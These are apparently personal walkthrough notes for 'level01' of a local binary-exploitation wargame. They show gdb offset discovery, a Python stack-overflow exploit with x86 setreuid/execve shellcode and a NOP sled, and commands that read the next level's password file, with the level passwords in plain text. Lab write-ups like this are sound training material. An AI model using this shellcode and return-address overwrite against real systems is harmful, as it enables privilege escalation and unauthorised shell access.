# level01 notes

1. Copy level01 binary file to host machine
scp -P 7777 level01@127.0.0.1:/home/users/level01/level01 ./Lien-Override/BinaryfromISO/level01

2. Decompiler Explorer:
https://dogbolt.org/?id=d2ff384a-ea37-4370-9ae5-4814118e5725

3. Find OFFSET: 
ssh level01@127.0.0.1 -p 7777
Enter password of level01: 
uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

python -c 'print "dat_wil\n" + "A"*80 + "BBBB"' > /tmp/test01

gdb ./level01

run < /tmp/test01
info registers

eip            0x42424242
->OFFSET=80

4. ssh level01@127.0.0.1 -p 7777
cd /home/users/level01

cat > /tmp/level01.py << 'EOF'
import struct
import sys

A_USER_NAME = 0x0804a040
RET_ADDR = A_USER_NAME + 20
OFFSET = 80

shellcode = (
    "\x31\xc0\xb0\x31\xcd\x80"      # geteuid()
    "\x89\xc3\x89\xc1"              # ebx = eax, ecx = eax
    "\x31\xc0\xb0\x46\xcd\x80"      # setreuid(euid, euid)
    "\x31\xc0\x50"                  # push NULL
    "\x68\x2f\x2f\x73\x68"          # push "//sh"
    "\x68\x2f\x62\x69\x6e"          # push "/bin"
    "\x89\xe3\x50\x53\x89\xe1"      # ebx="/bin//sh", argv
    "\x99\xb0\x0b\xcd\x80"          # execve("/bin/sh", argv, NULL)
)

username = "dat_wil" + "\x90" * 100 + shellcode
password = "A" * OFFSET + struct.pack("<I", RET_ADDR)

payload = username + "\n" + password + "\n"

sys.stdout.write(payload)
EOF

5. (python /tmp/level01.py; echo "id"; echo "whoami"; echo "cat /home/users/level02/.pass") | ./level01
OR ((python /tmp/level01.py; cat) | ./level01
id
whoami
cat /home/users/level02/.pass)

OR
python3 level01.py
scp -P 7777 payload_level01 level01@127.0.0.1:/tmp/payload_level01

6. Password of level02: cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
